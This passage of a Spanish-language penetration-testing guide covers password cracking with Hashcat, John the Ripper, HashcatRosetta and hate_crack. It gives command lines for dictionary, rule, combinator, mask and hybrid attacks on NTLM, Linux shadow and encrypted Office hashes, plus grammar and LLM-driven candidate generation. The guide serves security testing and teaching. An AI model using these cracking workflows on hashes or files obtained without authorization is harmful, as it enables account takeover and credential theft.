- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Generador avanzado de recorridos de teclado con caracteres base, mapa de teclado y rutas configurables.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### Mutación de John

Lee _**/etc/john/john.conf**_ y configúralo

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Ataques de Hashcat

- **Ataque de diccionario** (`-a 0`) con reglas

**Hashcat** ya incluye una **carpeta que contiene reglas**, pero puedes encontrar [**otras reglas interesantes aquí**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### Explicar y perfilar archivos de reglas

Las reglas de Hashcat ejecutan los opcodes de izquierda a derecha. Es fácil interpretarlas mal cuando las operaciones actúan en la posición cero: `^e ^h ^t` antepone `e`, luego `h` y después `t`, y por lo tanto transforma `password` en `thepassword`. Las sustituciones comparan bytes distinguiendo entre mayúsculas y minúsculas, así que una regla como `sa@` no hace nada con una `A` mayúscula. Prueba las reglas que no conozcas con palabras base representativas en minúsculas, mayúsculas y una combinación de ambas antes de dedicarles tiempo de GPU.<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) puede mostrar cada candidato intermedio y resumir la distribución de opcodes de un archivo de reglas completo. Los recuentos estáticos de opcodes revelan si un archivo se dedica principalmente a añadir caracteres al final o al principio, sustituirlos o truncarlos. No demuestran que una regla vaya a descifrar una contraseña, pero ayudan a seleccionar un conjunto de reglas que se ajuste a los patrones de contraseñas observados en la población objetivo.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Reduce las reglas redundantes con registros de depuración

El modo de depuración de Hashcat registra las transformaciones de reglas por separado de la salida normal de estado y resultados. El modo `4` escribe `baseword:rule:candidate`; el modo `5` añade la lista de palabras de origen. Establece siempre `--debug-file` de forma explícita. De lo contrario, Hashcat abre `hashcat.debugfile` en su directorio de perfil, y redirigir stdout captura el flujo de la consola en lugar de estos registros. Los archivos de depuración se abren en modo de anexado, así que elimina o rota un archivo antiguo antes de una nueva medición y protégelo, ya que contiene palabras base y candidatos en texto claro.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

Usa `frequency` para encontrar las reglas aplicadas con mayor frecuencia, `basewords` para medir la cobertura de entradas distintas y `candidates` para contar las salidas distintas. La clasificación de candidatos suele ser el mejor punto de partida para reducir la lista, porque una regla aplicada con frecuencia aún puede hacer que muchas entradas generen candidatos duplicados. Copia las reglas de mayor valor en un archivo más pequeño, vuelve a ejecutarlo contra los hashes restantes y compara los informes entre ejecuciones. El modo `5` también muestra si cada wordlist de origen aporta basewords útiles; fuerza el análisis con `--debug-mode 4` o `--debug-mode 5` cuando los dos puntos en los datos hagan ambiguo el reconocimiento automático.<sup>[[6]](#references)[[9]](#references)</sup>

- Ataque **Wordlist combinator**

Es posible **combinar 2 wordlists en 1** con hashcat.\
Si la lista 1 contuviera la palabra **"hello"** y la segunda contuviera 2 líneas con las palabras **"world"** y **"earth"**, se generarían las palabras `helloworld` y `helloearth`.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Ataques combinadores guiados por gramática (ejemplo de Office cifrado)

Una contraseña puede ser larga e incluir varias clases de caracteres y, aun así, tener un **espacio de búsqueda efectivo** pequeño si sigue una gramática conocida. Para un documento de Office cifrado obtenido durante una evaluación autorizada, `office2john.py` extrae el registro de verificación de contraseña; esto permite probar contraseñas localmente sin bloqueos, limitaciones de frecuencia ni MFA en línea. No elude el cifrado del documento.<sup>[[2]](#references)[[5]](#references)</sup>

Elimina el campo del nombre de archivo que John antepone para que Hashcat reciba solo el verificador:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

Selecciona `-m` a partir del prefijo extraído, no de la extensión del archivo. Hashcat asigna `$office$*2007*`, `$office$*2010*` y `$office$*2013*` a los modos `9400`, `9500` y `9600`; los registros heredados `$oldoffice$0/$1` y `$oldoffice$3/$4` usan los modos `9700` y `9800`, respectivamente.<sup>[[3]](#references)</sup>

Si la inteligencia obtenida del password reuse, las políticas, las pistas o personas que conocen al usuario revela una gramática como `<word><number><optional !><word>`, genera el prefijo enumerable de forma independiente como diccionario izquierdo. Este ejemplo prueba los números del `0` al `99`; sustituye el rango y las transformaciones por la información obtenida en la evaluación.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

El modo de ataque `1` de Hashcat añade cada línea del diccionario de la derecha a cada línea del diccionario de la izquierda, por lo que los archivos con `L` y `R` líneas generan `L × R` candidatos antes de aplicar reglas. El siguiente comando es específicamente para un registro heredado `$oldoffice$3/$4`; cambia el modo para otros formatos de Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

Este patrón de preprocesamiento se generaliza a otros formatos verificables sin conexión: enumera únicamente opciones plausibles de mayúsculas y minúsculas, fechas, separadores, dígitos o puntuación para un componente y luego combínalo con el componente restante, en lugar de aplicar fuerza bruta a la longitud nominal completa.<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### Valida los archivos `.hcmask` antes de ejecutar

Una línea malformada puede pasar desapercibida entre máscaras válidas, así que valida el archivo completo y su espacio de claves estimado antes de iniciar el ataque. HashcatRosetta indica la línea que falla y devuelve un estado distinto de cero si alguna máscara no es válida, por lo que esta comprobación es adecuada para scripts o CI.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

No normalices los archivos de máscara con analizadores genéricos de CSV o texto. Hashcat admite conjuntos de caracteres personalizados `?1` a `?8`, trata `#` como comentario solo cuando es el primer byte y elimina los escapes de barra invertida en una sola pasada antes de interpretar los tokens `?`. Por lo tanto, los espacios en blanco iniciales antes de `#` son datos de máscara, y los escapes pueden cambiar si una secuencia se interpreta como literal o como token de conjunto de caracteres.<sup>[[6]](#references)[[9]](#references)</sup>

- Ataque Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Ataques de Hashcat entrenados para el objetivo con hate_crack

[hate_crack](https://github.com/trustedsec/hate_crack) coordina pasadas locales de Hashcat después de que tengas un archivo de hashes y conozcas su modo de Hashcat. Hashcat debe instalarse por separado. Clona el repositorio con los submódulos, ejecuta `make` y luego inicia una sesión interactiva; el modo de ejemplo `1000` corresponde a NTLM, no es un valor predeterminado universal. Los clones existentes necesitan ejecutar `git submodule update --init --recursive` antes de usar las opciones PCFG y PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**Aprende una gramática a partir de plaintexts recuperados.** Ejecuta una pasada inicial de diccionario/reglas y luego entrena `pcfg_cracker` con plaintexts relevantes para el objetivo. Configura `pcfgRuleset` en `config.json` con el ruleset entrenado y elige PCFG (menú `20`) para enviar estructuras probables a Hashcat, o PRINCE-LING (`21`) para crear una lista base de PRINCE guiada por gramática. Limita ambos generadores con `pcfgMaxCandidates` y `pcfgPrinceLingMaxCandidates`; hate_crack no entrena la gramática por ti. PCFG aprende la probabilidad de estructuras como palabra base más dígitos y símbolos, a diferencia de la gramática fija del [ejemplo de combinator](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**Deriva reglas a partir de contraseñas conocidas.** Spoonman (menú `22`) toma un corpus de texto plano, incluido el archivo `.out` no vacío de la sesión actual, y deriva palabras base compuestas por letras minúsculas y reglas de Hashcat que reconstruyen las contraseñas observadas. Ordena las reglas según la cantidad de contraseñas del corpus que reproducen. Empieza por el nivel que cubre el 50% superior y amplíalo solo si el keyspace adicional está justificado; combina las palabras base derivadas con otras wordlists pertinentes cuando la cobertura esté limitada por el stem que falta, no por la mutación. Hashcat acepta un máximo de 31 funciones por regla y su alfabeto de posiciones abarca solo los índices `0`–`35`; Spoonman usa una palabra base literal y una regla no-op cuando no se puede codificar una contraseña. Los corpus muy grandes pueden alcanzar el límite máximo de su contador de memoria acotada, así que consulta la cobertura reportada en lugar de asumir que se reconstruyeron todas las contraseñas. Consulta [Comportamiento de las reglas de Hashcat](#explain-and-profile-rule-files) antes de reutilizar el resultado por separado.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**Elige un generador según la evidencia disponible.** OMEN (`13`) entrena un modelo de transiciones entre caracteres a partir de una lista de contraseñas y enumera candidatos por orden de probabilidad, hasta el límite de `omenMaxCandidates`. Markov brute force (`15`) puede, en cambio, crear una tabla `.hcstat2` a partir de los cracks del archivo `.out` actual o de una lista seleccionada, y probar un rango incremental de longitudes. Cuando la inteligencia sobre el objetivo consiste en prosa y no en contraseñas, N-gram (`16`) procesa un corpus, incluido el de entrada gzip, con `ngramX.bin`; el tamaño de grupo predeterminado es tres. Son alternativas, no tres copias de la misma lista de candidatos.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**Amplía solo grupos pequeños y plausibles.** Permutation (`17`) reordena todos los caracteres de cada palabra de entrada, por lo que incluso una palabra de ocho caracteres genera `8!` ordenamientos. Combipow (`19`) genera combinaciones de subconjuntos no vacíos a partir de un grupo pequeño de palabras de una frase de contraseña; `-s` inserta espacios y la herramienta rechaza más de 63 líneas de entrada. Combinator (`6`) puede unir varias wordlists con separadores mediante `--sepFill`; la concatenación habitual de dos listas está cubierta por el [combinator nativo de Hashcat](#hashcat-attacks) de arriba.<sup>[[13]](#references)[[14]](#references)</sup>

**Administra el presupuesto de los ataques con retroalimentación.** Fingerprint (`5`) amplía iterativamente las contraseñas descifradas recientemente, aumentando la longitud de los fragmentos, en vez de volver a expandir todo el corpus en cada ronda; su umbral de keyspace de combinaciones omite una pasada `-a 1` demasiado grande. Hybrid (`7`) prueba decoraciones `?s?d` más económicas antes de máscaras `?a` más amplias al principio o al final; `hcatHybridMaxRuntime` limita la duración de la ejecución. Esto importa porque el costo de una pasada híbrida es el tamaño de la wordlist multiplicado por el espacio de la máscara, así que una máscara amplia sobre una lista grande puede superar ampliamente el costo de las pasadas iniciales.<sup>[[13]](#references)[[14]](#references)</sup>

**Genera candidatos a partir de contraseñas recuperadas con un LLM local.** Después de que una pasada inicial haya generado un `<hashfile>.out` no vacío, el ataque LLM de hate_crack (menú principal `12`, submenú **Cracked passwords** `3`) puede inferir palabras base, años, sufijos y uso de mayúsculas y minúsculas específicos del objetivo, y luego enviar nuevos candidatos a Hashcat. Los corpus pequeños pueden incluir las contraseñas en texto plano recuperadas en el prompt del modelo; los corpus más grandes se resumen en estadísticas. Esto generaliza las convenciones observadas, en vez de limitarse a reproducir las [reglas](#explain-and-profile-rule-files) o [máscaras](#hashcat-attacks) fijas de arriba.<sup>[[13]](#references)[[14]](#references)</sup>

Configura en el archivo `.env` de hate_crack un modelo local de Ollama que ya esté disponible; no descarga el modelo automáticamente. `OLLAMA_NO_CLOUD=true` rechaza los modelos etiquetados como cloud y las direcciones de endpoints externos. Una dirección de localhost por sí sola no basta: Ollama puede usar un proxy para ejecutar remotamente un modelo `-cloud`, y los prompts pueden contener contraseñas recuperadas o estadísticas del corpus. Esta opción sigue permitiendo endpoints de redes privadas y no puede descartar un proxy de transporte, así que verifica la ruta de inferencia antes de enviar datos de clientes.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

Compara el rendimiento de los candidatos con pasadas más económicas de reglas, máscaras y entrenamiento específico para el objetivo antes de asignar un presupuesto mayor. El modelo genera conjeturas; Hashcat sigue probándolas contra los hashes.<sup>[[13]](#references)[[14]](#references)</sup>

#### Modos de Hashcat

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Cracking de hashes de Linux - archivo /etc/shadow

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Cracking de hashes de Windows

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Cracking hashes comunes de aplicaciones

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [Dentro de GoBruteforcer: valores predeterminados de servidor generados por IA, contraseñas débiles y campañas centradas en criptomonedas](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Hashes de ejemplo de Hashcat y modos de Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [Planificación patrimonial de credenciales](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [Repositorio de HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
- [7] [Implementación del archivo de depuración de Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Ayuda de la línea de comandos de Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: leer la piedra de Rosetta del descifrado de contraseñas](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [Repositorio y uso de PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
- [11] [Repositorio y guía de usuario de OMEN](https://github.com/RUB-SysSec/OMEN)
- [12] [Problema original de Spoonman y diseño de derivación de reglas](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [Repositorio de hate_crack y documentación de ataques](https://github.com/trustedsec/hate_crack)
- [14] [Novedades de hate_crack desde la versión 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [Política de destino de LLM de hate_crack](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
